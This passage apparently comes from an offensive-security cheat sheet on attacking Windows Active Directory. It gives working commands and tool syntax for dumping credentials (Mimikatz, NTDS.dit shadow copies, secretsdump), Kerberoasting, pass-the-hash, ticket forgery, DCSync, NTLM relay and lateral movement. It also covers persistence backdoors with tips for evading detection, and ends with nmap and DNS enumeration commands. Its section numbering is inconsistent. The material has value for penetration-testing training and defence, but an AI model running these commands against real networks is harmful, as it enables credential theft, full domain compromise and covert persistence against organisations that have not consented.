  • Credential Guard isolates LSASS in a Hyper-V container, blocking Mimikatz hash extraction; check with Get-ComputerInfo -Property DeviceGuard*.
  • Up to 10 domain credential hashes (MSCACHEv2) are cached locally; extractable with Mimikatz lsadump::cache.
  • VSS extraction: vssadmin create shadow /for=C: then copy NTDS.dit from the shadow path; combine with reg save HKLM\SYSTEM for offline decryption.
  • impacket-secretsdump extracts hashes remotely over SMB or locally from a copied NTDS.dit + SYSTEM hive — no Mimikatz needed on the target.
  • WDigest cleartext risk: if HKLM\...\WDigest\UseLogonCredential=1 (default on pre-Win8.1), Mimikatz sekurlsa::wdigest retrieves cleartext credentials.
  • PPL (Protected Process Light) on LSASS blocks standard reads; bypass requires a signed or vulnerable kernel driver (e.g., RTCore64.sys).

13.4 Common Attack Vectors

Know the precondition for each technique — that tells you which one to try first.

  • AS-REP Roasting — Target accounts with DONT_REQ_PREAUTH; any unauthenticated user can request the AS-REP; the encrypted blob is crackable offline with hashcat -m 18200.
  • Kerberoasting — Any valid domain account can request a TGS for any SPN; ticket is encrypted with the service account's NT hash (RC4 by default); crack offline with hashcat -m 13100.
  • Pass-the-Hash (PtH) — Substitute the NT hash directly into the NTLM handshake; does not work where Restrict NTLM GPO is enforced — use Overpass-the-Hash instead.
  • Overpass-the-Hash — Convert an NT hash to a Kerberos TGT via Mimikatz sekurlsa::pth; enables Kerberos-based lateral movement where NTLM is restricted.
  • Pass-the-Ticket (PtT) — Export TGT/TGS from memory; inject into session for transparent Kerberos authentication under that identity.
  • Silver Ticket — Forged offline using the service account's NT hash, domain SID, and target SPN; never touches the KDC, bypassing DC-side TGS logging. Only valid for the specific service; PAC validation can detect it.
  • Golden Ticket — Requires the krbtgt NT hash (via DCSync or NTDS.dit); forged TGT accepted by any KDC; survives admin password resets — only a double-reset of krbtgt invalidates it.
  • Unconstrained Delegation — DC places the authenticating user's full TGT inside the TGS; coerce a DC to authenticate via Printer Bug or PetitPotam to capture its TGT.
  • Constrained Delegation (S4U) — Control an account with msDS-AllowedToDelegateTo; forge a service ticket impersonating any user to the configured target service.
  • RBCD — Write msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer (requires GenericWrite); gives S4U2Proxy delegation without SeEnableDelegationPrivilege on the DC.
  • DCSync — Requires DS-Replication-Get-Changes + DS-Replication-Get-Changes-All; impersonates a DC to pull NT hashes for any account without touching the DC's disk. Modern SIEMs and MDI flag replication traffic — minimise accounts requested.
  • NTLM Relay — Intercept NTLM auth via LLMNR/NBT-NS poisoning or coercion; relay to SMB/LDAP/HTTP; LDAP relay to DC is most effective when LDAP signing is not enforced (allows RBCD config or new account creation). Identify signing-disabled targets first: crackmapexec smb <subnet> --gen-relay-list targets.txt.
AD Attack Precondition / What It Needs Primary Tool(s) Result / What You Get
AS-REP Roasting Account has DONT_REQ_PREAUTH set; no domain credentials required to request impacket-GetNPUsers, Rubeus asreproast, hashcat -m 18200 Offline-crackable AS-REP hash → plaintext password of the target account
Kerberoasting Any valid domain account; target account must have an SPN registered impacket-GetUserSPNs, Rubeus kerberoast, PowerView Get-DomainSPNTicket, hashcat -m 13100 Offline-crackable TGS hash → plaintext password of the service account
Pass-the-Hash (PtH) NT hash of a local or domain admin account; NTLM must not be blocked impacket-psexec, impacket-wmiexec, CrackMapExec, Mimikatz sekurlsa::pth Authenticated shell / command execution on remote host without knowing the plaintext password
Overpass-the-Hash NT hash of any domain account; Kerberos available on the network Mimikatz sekurlsa::pth /ntlm:<hash> /run:cmd.exe, Rubeus asktgt /rc4:<hash> Full Kerberos TGT for the account → Kerberos-based lateral movement even where NTLM is restricted
Pass-the-Ticket (PtT) Access to a valid TGT or TGS from memory (requires local admin on victim host) Mimikatz sekurlsa::tickets /export + kerberos::ptt, Rubeus dump + ptt Impersonation of the ticket owner for network resource access; lateral movement under that identity
Silver Ticket NT hash of the service account; domain SID; target SPN Mimikatz kerberos::golden /target:<host> /service:<svc> /rc4:<hash>, impacket-ticketer Forged TGS granting access to a specific service; no KDC contact → stealth; bypasses DC-side TGS logging
Golden Ticket krbtgt NT hash (from DCSync or NTDS.dit); domain SID Mimikatz kerberos::golden /krbtgt:<hash> /user:Administrator, impacket-ticketer Forged TGT accepted by any KDC; impersonate any domain user indefinitely; survives admin password resets
DCSync DS-Replication-Get-Changes + DS-Replication-Get-Changes-All rights on the domain object Mimikatz lsadump::dcsync /user:krbtgt, impacket-secretsdump -just-dc NT hashes (and Kerberos keys) for any account in the domain without touching the DC's disk
Unconstrained Delegation Abuse Compromise a host/account configured for unconstrained delegation; coerce a privileged account (e.g., DC) to authenticate to it Rubeus monitor + Printer Bug (SpoolSample) / PetitPotam, Mimikatz sekurlsa::tickets Capture of the coerced account's TGT → impersonation of DC or Domain Admin → full domain compromise
Constrained Delegation Abuse (S4U) Control of an account that has constrained delegation configured (msDS-AllowedToDelegateTo) Rubeus s4u, impacket-getST Service ticket impersonating any user to the configured target service (e.g., CIFS on a DC)
RBCD (Resource-Based Constrained Delegation) Write access to msDS-AllowedToActOnBehalfOfOtherIdentity on target + ability to create/control a machine account PowerView Set-DomainObject, Rubeus s4u, impacket-getST S4U2Proxy ticket to impersonate any user to the target host; useful when only GenericWrite on a computer object
NTLM Relay Ability to intercept NTLM authentication (e.g., via LLMNR/NBT-NS poisoning or coercion); SMB signing disabled on target Responder (poisoning), impacket-ntlmrelayx Relay hash to SMB/LDAP/HTTP to create accounts, dump SAM, execute commands, or configure RBCD
AS-REP + NTLM Relay combo Target without pre-auth; relay target with SMB signing disabled impacket-GetNPUsers + ntlmrelayx Chained access: cracked credentials from AS-REP relayed for remote execution

13.5 Lateral Movement

  • Pass-the-Hash for NTLM-accessible hosts; Overpass-the-Hash when NTLM is restricted but you hold an NT hash.
  • Export tickets with Mimikatz sekurlsa::tickets /export or Rubeus dump; inject with kerberos::ptt or Rubeus ptt.
  • Remote execution paths: PsExec (noisy — creates a named-pipe service), WMI / impacket-wmiexec (quieter), WinRM (port 5985/5986), Scheduled Tasks.
  • DCOM objects (MMC20.Application, ShellWindows) over port 135 leave a different forensic footprint than PsExec; impacket-dcomexec automates this.
  • With SeImpersonatePrivilege, Potato exploits (PrintSpoofer, GodPotato) can impersonate the SYSTEM token.
  • Use BloodHound "Shortest Paths to Domain Admins" and CrackMapExec --local-auth spray to find accounts with local admin on multiple machines.
  • Credential hunting before moving on: browser stores, %APPDATA%\...\credentials, unattend.xml/sysprep.xml, SYSVOL Groups.xml (cpassword), PowerShell history at $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt.
  • GPP passwords in SYSVOL are encrypted with a publicly known AES key; Get-GPPPassword or gpp-decrypt decrypts them automatically.

13.6 Persistence

  • Golden Ticket lifetime can be set to 10 years; only a double-reset of the krbtgt account invalidates existing tickets.
  • DCSync: request replication updates to retrieve NT hashes and Kerberos keys for every domain account without touching the DC's disk.
  • AdminSDHolder abuse — Write a backdoor ACE on the AdminSDHolder object; SDProp propagates it to all protected groups every 60 minutes.
  • SID History injection — Adding a high-privileged SID (e.g., Enterprise Admins) to an account's SID history grants those permissions across trusts without group membership.
  • RBCD persistence — Write a controlled machine account to msDS-AllowedToActOnBehalfOfOtherIdentity on a target; gives persistent S4U2Proxy delegation rights that survive password changes.
  • Shadow Credentials — With write access to msDS-KeyCredentialLink, add a controlled key pair; PKINIT then issues a TGT for the account without knowing its password — survives password resets.
  • Diamond Ticket — Request a legitimate TGT, replace its PAC with a forged one; avoids anomalous ticket fields that defenders detect in classic Golden Tickets.
  • Subtle persistence: grant DCSync rights directly on the domain object, or add WriteDACL on a critical OU to an inconspicuous account rather than adding to Domain Admins.
  • GPO persistence: with GpoEditRights on a GPO linked to a high-value OU, embed a startup script or Immediate Scheduled Task — executes on every affected machine at next Group Policy refresh (~90 min).
  • Golden Ticket detection: Event ID 4769 with encryption type 0x17 (RC4 in an AES-norm environment) and anomalous ticket lifetimes; request AES-encrypted tickets to blend in.

14. Active Directory Enumeration

All authentication and resource discovery flows through the Domain Controller, making it the highest-value target. Begin AD enumeration as soon as you have any foothold — credentials, a domain-joined shell, or unauthenticated network access to DC ports.

Port / Protocol Service Key Tools What It Yields Requires Creds? OPSEC / Noise
53 / DNS DNS dig axfr, dnsrecon, dnsenum, nmap --script dns-* All hostnames, DCs, SRV locator records, reverse PTR map No (AXFR is often open) Low — AXFR logged, brute-force medium
88 / Kerberos Kerberos KDC kerbrute, GetNPUsers.py, GetUserSPNs.py, Rubeus Valid usernames, AS-REP hashes (no-preauth), TGS hashes (Kerberoast), TGTs/tickets No for user enum / AS-REP; any creds for Kerberoast Medium — Event 4768/4769 per ticket request
135, 49152+ / RPC MS-RPC / EPM rpcclient, impacket-rpcmap, enum4linux Users, groups, domain SID, password policy, printers Null session often works Medium — null sessions logged on newer DCs
139, 445 / SMB SMB / CIFS crackmapexec smb, smbclient, smbmap, enum4linux, nmap smb-* Shares (SYSVOL/GPP passwords), sessions, OS info, user list via RID brute Null/guest often works; admin for exec Medium-High — Event 4625 per failed auth; RID brute loud
389 / LDAP LDAP ldapsearch, nmap ldap-*, PowerView Get-NetUser All directory objects: users, groups, computers, GPOs, LAPS passwords, SPNs, delegation flags Anonymous bind sometimes allowed; any creds for full dump Low-Medium — broad wildcard queries visible in LDAP audit log
636 / LDAPS LDAP over TLS ldapsearch -H ldaps://, ldap3 library Same as LDAP but encrypted — preferred when creds are used Same as LDAP Low — encrypted, harder to inspect in transit
3268, 3269 / GC Global Catalog (plain / TLS) ldapsearch -p 3268 Cross-domain user/group objects in a forest; faster for forest-wide user searches Usually any domain creds Low
5985, 5986 / WinRM WinRM (HTTP/HTTPS) evil-winrm, crackmapexec winrm, Enter-PSSession Interactive PowerShell shell; remote code execution as authenticated user Yes — valid creds needed; user must be in Remote Management Users Medium — PowerShell transcription logs Event 4103/4104
9389 / AD Web Svc Active Directory Web Services PowerShell ActiveDirectory module (Get-ADUser etc.) All AD objects via SOAP/ADWS; same data as LDAP but requires the AD module Yes — domain credentials Low

14.1 Initial Recon with Nmap

Scan canonical DC ports first to confirm DC roles and exposed services before any authenticated enumeration.

# Full AD port scan — identify DC services and roles
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49152-65535 -sS -sV -oA ad-enum [target-ip]
# LDAP service scripts
nmap -n -sV --script "ldap* and not brute" -p 389 [dc-ip]
# Enumerate all AD users (requires valid credentials)
impacket-GetADUsers -all -dc-ip [dc_ip] -u [username] -p [password] [domain]

Common Active Directory ports: 53 DNS, 88 Kerberos, 135 RPC, 139/445 SMB, 389/636 LDAP/LDAPS, 464 Kerberos Password Change, 5985 WinRM.

12.1.1 DNS Enumeration (Port 53)

Query DNS for zone transfers, SRV locator records, and reverse lookups to map domain infrastructure without touching any other protocol.

# Nmap DNS scripts — brute, nsid, recursion, zone-transfer, SRV records
nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53 [target_ip]
nmap -p 53 --script "dns-nsid,dns-srv-enum" [target_ip]
# Zone transfer
dig axfr @[dc-ip] [domain]
dig axfr [domain_name] @[dns_server_ip]
dig ANY [domain_name] @[dns_server_ip]
# DNS record lookups — A record, LDAP SRV locator
